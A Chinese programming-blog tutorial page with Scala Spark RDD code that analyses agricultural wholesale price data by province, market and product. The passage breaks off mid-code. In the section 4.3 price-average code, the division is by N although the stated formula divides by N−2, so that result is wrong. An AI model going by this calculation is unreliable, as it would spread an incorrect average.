<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【大数据开发】SparkCore、SparkSQL综合练习——对农产品数据进行分析 - 编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="【大数据开发】SparkCore、SparkSQL综合练习——对农产品数据进行分析" />
<meta property="og:description" content="发现一个idea很神奇的功能，每次写一堆算子的时候，先在最后面写一个Action算子过去，然后再从中间开始写transformation算子，这个时候神奇的事情发生了，在每个算子后面会显示出灰色的返回值类型！！！
文章目录 一、数据背景二、数据类型三、功能要求四、SparkCore代码实现4.1 农产品市场个数统计4.2农产品种类统计4.3计算山西省每种农产品的价格波动趋势 五、SparkSQL代码实现六、业务数据 一、数据背景 该数据每日进行采集汇总。数据范围涵盖全国主要省份（港澳台、西藏、海南暂无数据）的180&#43;的大型农产品批发市场，380&#43;的农产品品类（由于季节性和地域性等特点，每日的数据中不一定会涵盖全部的农产品品类）。
二、数据类型 农产品批发市场价格数据products.txt	中文名称	英文名称	数据类型 农产品名称(列1)	name	string 批发价格(列2)	price	float 采集时间(列3)	craw_time	timestamp 批发市场名称(列4)	market	string 省份(列5)	province	string 城市(列6)	city	string 三、功能要求 要求使用分别使用RDD、DataFrame两种方式实现
1、农产品市场个数统计
（省份，蔬菜，1）
1)统计每个省份的农产品市场总数
2)统计没有农产品市场的省份有哪些
2、农产品种类统计
1)根据农产品类型数量，统计排名前 3 名的省份
2)根据农产品类型数量，统计每个省份排名前 3 名的农产品市场
3、价格区间统计,计算山西省每种农产品的价格波动趋势，即计算每天价格均值，并将结果输出到控制台上。
某种农产品的价格均值计算公式：
PAVG = (PM1&#43;PM2&#43;…&#43;PMn-max§-min§)/(N-2)
其中，P 表示价格，Mn 表示 market，即农产品市场。PM1 表示 M1 农产品市场的该产品价格，max§表示价格最大值，min§价格最小值。
四、SparkCore代码实现 4.1 农产品市场个数统计 4.1.1
import org.apache.spark.rdd.RDD import org.apache.spark.{SparkConf, SparkContext} /** * 1)统计每个省份的农产品市场总数 */ object ByRdd_1_1 { private val sc: SparkContext = new SparkContext(new SparkConf()." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bchobby.github.io/posts/8488678737c1ce08506c75d26234ddf6/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-10-17T17:37:36+08:00" />
<meta property="article:modified_time" content="2020-10-17T17:37:36+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【大数据开发】SparkCore、SparkSQL综合练习——对农产品数据进行分析</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-github-gist">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <blockquote> 
 <p>发现一个idea很神奇的功能，每次写一堆算子的时候，先在最后面写一个Action算子过去，然后再从中间开始写transformation算子，这个时候神奇的事情发生了，在每个算子后面会显示出灰色的返回值类型！！！</p> 
</blockquote> 
<p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#_4" rel="nofollow">一、数据背景</a></li><li><a href="#_7" rel="nofollow">二、数据类型</a></li><li><a href="#_20" rel="nofollow">三、功能要求</a></li><li><a href="#SparkCore_40" rel="nofollow">四、SparkCore代码实现</a></li><li><ul><li><a href="#41__41" rel="nofollow">4.1 农产品市场个数统计</a></li><li><a href="#42_105" rel="nofollow">4.2农产品种类统计</a></li><li><a href="#43_176" rel="nofollow">4.3计算山西省每种农产品的价格波动趋势</a></li></ul> 
  </li><li><a href="#SparkSQL_213" rel="nofollow">五、SparkSQL代码实现</a></li><li><a href="#_291" rel="nofollow">六、业务数据</a></li></ul> 
</div> 
<p></p> 
<h2><a id="_4"></a>一、数据背景</h2> 
<p>该数据每日进行采集汇总。数据范围涵盖全国主要省份（港澳台、西藏、海南暂无数据）的180+的大型农产品批发市场，380+的农产品品类（由于季节性和地域性等特点，每日的数据中不一定会涵盖全部的农产品品类）。</p> 
<h2><a id="_7"></a>二、数据类型</h2> 
<pre><code class="prism language-java">农产品批发市场价格数据products<span class="token punctuation">.</span>txt	
	中文名称			英文名称	数据类型
	农产品名称<span class="token punctuation">(</span>列<span class="token number">1</span><span class="token punctuation">)</span>	name	string
	批发价格<span class="token punctuation">(</span>列<span class="token number">2</span><span class="token punctuation">)</span>		price	<span class="token keyword">float</span>
	采集时间<span class="token punctuation">(</span>列<span class="token number">3</span><span class="token punctuation">)</span>		craw_time	timestamp
	批发市场名称<span class="token punctuation">(</span>列<span class="token number">4</span><span class="token punctuation">)</span>	market	string
	省份<span class="token punctuation">(</span>列<span class="token number">5</span><span class="token punctuation">)</span>			province	string
	城市<span class="token punctuation">(</span>列<span class="token number">6</span><span class="token punctuation">)</span>			city	string
</code></pre> 
<h2><a id="_20"></a>三、功能要求</h2> 
<p>要求使用分别使用RDD、DataFrame两种方式实现</p> 
<p>1、农产品市场个数统计<br> （省份，蔬菜，1）<br> 1)统计每个省份的农产品市场总数<br> 2)统计没有农产品市场的省份有哪些</p> 
<p>2、农产品种类统计<br> 1)根据农产品类型数量，统计排名前 3 名的省份<br> 2)根据农产品类型数量，统计每个省份排名前 3 名的农产品市场</p> 
<p>3、价格区间统计,计算山西省每种农产品的价格波动趋势，即计算每天价格均值，并将结果输出到控制台上。<br> 某种农产品的价格均值计算公式：<br> PAVG = (PM1+PM2+…+PMn-max§-min§)/(N-2)<br> 其中，P 表示价格，Mn 表示 market，即农产品市场。PM1 表示 M1 农产品市场的该产品价格，max§表示价格最大值，min§价格最小值。</p> 
<h2><a id="SparkCore_40"></a>四、SparkCore代码实现</h2> 
<h3><a id="41__41"></a>4.1 农产品市场个数统计</h3> 
<p><strong>4.1.1</strong></p> 
<pre><code class="prism language-scala"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>spark<span class="token punctuation">.</span>rdd<span class="token punctuation">.</span>RDD
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>spark<span class="token punctuation">.</span><span class="token punctuation">{<!-- --></span>SparkConf<span class="token punctuation">,</span> SparkContext<span class="token punctuation">}</span>

<span class="token comment">/**
 * 1)统计每个省份的农产品市场总数
 */</span>
<span class="token keyword">object</span> ByRdd_1_1 <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">private</span> <span class="token keyword">val</span> sc<span class="token operator">:</span> SparkContext <span class="token operator">=</span> <span class="token keyword">new</span> SparkContext<span class="token punctuation">(</span><span class="token keyword">new</span> SparkConf<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setMaster<span class="token punctuation">(</span><span class="token string">"local"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setAppName<span class="token punctuation">(</span><span class="token string">"dataframe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">val</span> productRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> sc<span class="token punctuation">.</span>textFile<span class="token punctuation">(</span><span class="token string">"src/file/test/products.txt"</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Unit</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">//1.按照一个或者多个tab键切割(\s匹配任何空白字符，包括空格、制表符、换页符等等)</span>
        <span class="token keyword">val</span> provinceRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">String</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> productRDD<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>_<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\\s+"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>map<span class="token punctuation">(</span>line <span class="token keyword">=&gt;</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">val</span> parts<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\\s+"</span><span class="token punctuation">)</span>
                <span class="token punctuation">(</span>parts<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> parts<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token comment">//2.去除重复数据，按照key分组计算</span>
        <span class="token keyword">val</span> result<span class="token operator">:</span> collection<span class="token punctuation">.</span>Map<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">Long</span><span class="token punctuation">]</span> <span class="token operator">=</span> provinceRDD<span class="token punctuation">.</span>distinct<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>countByKey<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> v<span class="token punctuation">)</span> <span class="token keyword">&lt;-</span> result<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            println<span class="token punctuation">(</span>s<span class="token string">"省份：$k ,数量：$v"</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> 
<p><strong>4.1.2</strong></p> 
<pre><code class="prism language-scala"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>spark<span class="token punctuation">.</span><span class="token punctuation">{<!-- --></span>SparkConf<span class="token punctuation">,</span> SparkContext<span class="token punctuation">}</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>spark<span class="token punctuation">.</span>rdd<span class="token punctuation">.</span>RDD

<span class="token comment">/**
 * 2)统计没有农产品市场的省份有哪些
 */</span>
<span class="token keyword">object</span> ByRDD_1_2 <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token keyword">val</span> sc<span class="token operator">:</span> SparkContext <span class="token operator">=</span> <span class="token keyword">new</span> SparkContext<span class="token punctuation">(</span><span class="token keyword">new</span> SparkConf<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setMaster<span class="token punctuation">(</span><span class="token string">"local"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setAppName<span class="token punctuation">(</span><span class="token string">"dataframe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">val</span> productRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> sc<span class="token punctuation">.</span>textFile<span class="token punctuation">(</span><span class="token string">"src/file/test/products.txt"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">val</span> allProvinceRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> sc<span class="token punctuation">.</span>textFile<span class="token punctuation">(</span><span class="token string">"src/file/test/allprovinces.txt"</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Unit</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">//1.按照一个或者多个tab键切割(\s匹配任何空白字符，包括空格、制表符、换页符等等)</span>
        <span class="token keyword">val</span> province<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> productRDD<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>_<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\\s+"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>map<span class="token punctuation">(</span>line <span class="token keyword">=&gt;</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\\s+"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token comment">//2.读取省份信息</span>

        <span class="token keyword">val</span> allProvinces<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> allProvinceRDD<span class="token punctuation">.</span>map<span class="token punctuation">(</span>line <span class="token keyword">=&gt;</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\\s+"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token comment">//3.求出省份</span>
        <span class="token keyword">val</span> result<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> allProvinces<span class="token punctuation">.</span>subtract<span class="token punctuation">(</span>province<span class="token punctuation">)</span>
        result<span class="token punctuation">.</span>foreach<span class="token punctuation">(</span>println<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> 
<h3><a id="42_105"></a>4.2农产品种类统计</h3> 
<p><strong>4.2.1</strong></p> 
<pre><code class="prism language-scala"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>spark<span class="token punctuation">.</span>rdd<span class="token punctuation">.</span>RDD
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>spark<span class="token punctuation">.</span><span class="token punctuation">{<!-- --></span>SparkConf<span class="token punctuation">,</span> SparkContext<span class="token punctuation">}</span>

<span class="token comment">/**
 *2、农产品种类统计
 *1)根据农产品类型数量，统计排名前 3 名的省份
 */</span>

<span class="token keyword">object</span> ByRDD_2_1 <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">private</span> <span class="token keyword">val</span> sc<span class="token operator">:</span> SparkContext <span class="token operator">=</span> <span class="token keyword">new</span> SparkContext<span class="token punctuation">(</span><span class="token keyword">new</span> SparkConf<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setMaster<span class="token punctuation">(</span><span class="token string">"local"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setAppName<span class="token punctuation">(</span><span class="token string">"dataframe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">val</span> productRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> sc<span class="token punctuation">.</span>textFile<span class="token punctuation">(</span><span class="token string">"src/file/test/products.txt"</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Unit</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>

        <span class="token comment">//1.得到RDD[(省份, 种类)]</span>
        <span class="token keyword">val</span> provinceAndType<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">String</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> productRDD<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>_<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\\s+"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>map<span class="token punctuation">(</span>line <span class="token keyword">=&gt;</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">val</span> parts<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\\s+"</span><span class="token punctuation">)</span>
                <span class="token punctuation">(</span>parts<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> parts<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>

        <span class="token comment">//2.计算每个省份的种类和</span>
        <span class="token keyword">val</span> sumRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">Int</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> provinceAndType<span class="token punctuation">.</span>distinct<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mapValues<span class="token punctuation">(</span>_ <span class="token keyword">=&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reduceByKey<span class="token punctuation">(</span>_ <span class="token operator">+</span> _<span class="token punctuation">)</span>

        sumRDD<span class="token punctuation">.</span>sortBy<span class="token punctuation">(</span><span class="token operator">-</span>_<span class="token punctuation">.</span>_2<span class="token punctuation">)</span>
            <span class="token punctuation">.</span>take<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>foreach<span class="token punctuation">(</span>println<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> 
<p><strong>4.2.2</strong></p> 
<pre><code class="prism language-scala"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>spark<span class="token punctuation">.</span><span class="token punctuation">{<!-- --></span>SparkConf<span class="token punctuation">,</span> SparkContext<span class="token punctuation">}</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>spark<span class="token punctuation">.</span>rdd<span class="token punctuation">.</span>RDD

<span class="token keyword">object</span> ByRDD_3_1 <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token keyword">val</span> sc<span class="token operator">:</span> SparkContext <span class="token operator">=</span> <span class="token keyword">new</span> SparkContext<span class="token punctuation">(</span><span class="token keyword">new</span> SparkConf<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setMaster<span class="token punctuation">(</span><span class="token string">"local"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setAppName<span class="token punctuation">(</span><span class="token string">"dataframe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">val</span> productRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> sc<span class="token punctuation">.</span>textFile<span class="token punctuation">(</span><span class="token string">"src/file/test/products.txt"</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Unit</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>

        <span class="token comment">//1.获取 RDD[((省份, 市场), 种类)]</span>
        <span class="token keyword">val</span> provinceAndTypeRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">String</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">String</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> productRDD<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>_<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\\s+"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>map<span class="token punctuation">(</span>line <span class="token keyword">=&gt;</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">val</span> parts<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\\s+"</span><span class="token punctuation">)</span>
                <span class="token punctuation">(</span><span class="token punctuation">(</span>parts<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> parts<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>parts<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>

        provinceAndTypeRDD<span class="token punctuation">.</span>distinct<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>mapValues<span class="token punctuation">(</span>_ <span class="token keyword">=&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">//这一步可以在1.位置做</span>
            <span class="token punctuation">.</span>reduceByKey<span class="token punctuation">(</span>_ <span class="token operator">+</span> _<span class="token punctuation">)</span>
            <span class="token punctuation">.</span>map<span class="token punctuation">(</span>t <span class="token keyword">=&gt;</span> <span class="token punctuation">(</span>t<span class="token punctuation">.</span>_1<span class="token punctuation">.</span>_1<span class="token punctuation">,</span> <span class="token punctuation">(</span>t<span class="token punctuation">.</span>_1<span class="token punctuation">.</span>_2<span class="token punctuation">,</span> t<span class="token punctuation">.</span>_2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">//重新划分Rdd的类型</span>
            <span class="token punctuation">.</span>groupByKey<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>mapValues<span class="token punctuation">(</span>_<span class="token punctuation">.</span>toList<span class="token punctuation">.</span>sortBy<span class="token punctuation">(</span><span class="token operator">-</span>_<span class="token punctuation">.</span>_2<span class="token punctuation">)</span><span class="token punctuation">.</span>take<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>mapValues<span class="token punctuation">(</span>_<span class="token punctuation">.</span>map<span class="token punctuation">(</span>_<span class="token punctuation">.</span>_1<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment">//去除数量，保留省份</span>
            <span class="token punctuation">.</span>foreach<span class="token punctuation">(</span>println<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> 
<h3><a id="43_176"></a>4.3计算山西省每种农产品的价格波动趋势</h3> 
<pre><code class="prism language-scala"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>spark<span class="token punctuation">.</span><span class="token punctuation">{<!-- --></span>SparkConf<span class="token punctuation">,</span> SparkContext<span class="token punctuation">}</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>spark<span class="token punctuation">.</span>rdd<span class="token punctuation">.</span>RDD

<span class="token keyword">object</span> ByRDD_3_2 <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token keyword">val</span> sc<span class="token operator">:</span> SparkContext <span class="token operator">=</span> <span class="token keyword">new</span> SparkContext<span class="token punctuation">(</span><span class="token keyword">new</span> SparkConf<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setMaster<span class="token punctuation">(</span><span class="token string">"local"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setAppName<span class="token punctuation">(</span><span class="token string">"dataframe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token keyword">val</span> productRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> sc<span class="token punctuation">.</span>textFile<span class="token punctuation">(</span><span class="token string">"src/file/test/products.txt"</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Unit</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// RDD[(农产品, 价格)</span>
        <span class="token keyword">val</span> nameAndPriceRDD<span class="token operator">:</span> RDD<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">Double</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> productRDD<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>_<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\\s+"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>map<span class="token punctuation">(</span>line <span class="token keyword">=&gt;</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">val</span> productInfo<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\\s+"</span><span class="token punctuation">)</span>
                <span class="token punctuation">(</span>productInfo<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> productInfo<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> productInfo<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>toDouble<span class="token punctuation">)</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>filter<span class="token punctuation">(</span>_<span class="token punctuation">.</span>_1<span class="token punctuation">.</span>equals<span class="token punctuation">(</span><span class="token string">"山西"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>map<span class="token punctuation">(</span>t <span class="token keyword">=&gt;</span> <span class="token punctuation">(</span>t<span class="token punctuation">.</span>_2<span class="token punctuation">,</span> t<span class="token punctuation">.</span>_3<span class="token punctuation">)</span><span class="token punctuation">)</span>

        nameAndPriceRDD
            <span class="token punctuation">.</span>groupByKey<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span>map<span class="token punctuation">(</span>t <span class="token keyword">=&gt;</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>t<span class="token punctuation">.</span>_2<span class="token punctuation">.</span>size<span class="token operator">&gt;</span><span class="token number">2</span><span class="token punctuation">)</span>
                    <span class="token punctuation">(</span>t<span class="token punctuation">.</span>_1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>_2<span class="token punctuation">.</span>sum <span class="token operator">-</span> t<span class="token punctuation">.</span>_2<span class="token punctuation">.</span>max <span class="token operator">-</span> t<span class="token punctuation">.</span>_2<span class="token punctuation">.</span>min<span class="token punctuation">)</span><span class="token operator">/</span>t<span class="token punctuation">.</span>_2<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>formatted<span class="token punctuation">(</span><span class="token string">"%.2f"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">else</span>
                    <span class="token punctuation">(</span>t<span class="token punctuation">.</span>_1<span class="token punctuation">,</span> <span class="token punctuation">(</span>t<span class="token punctuation">.</span>_2<span class="token punctuation">.</span>sum<span class="token operator">/</span>t<span class="token punctuation">.</span>_2<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>formatted<span class="token punctuation">(</span><span class="token string">"%.2f"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>       <span class="token comment">// 农产品分类</span>
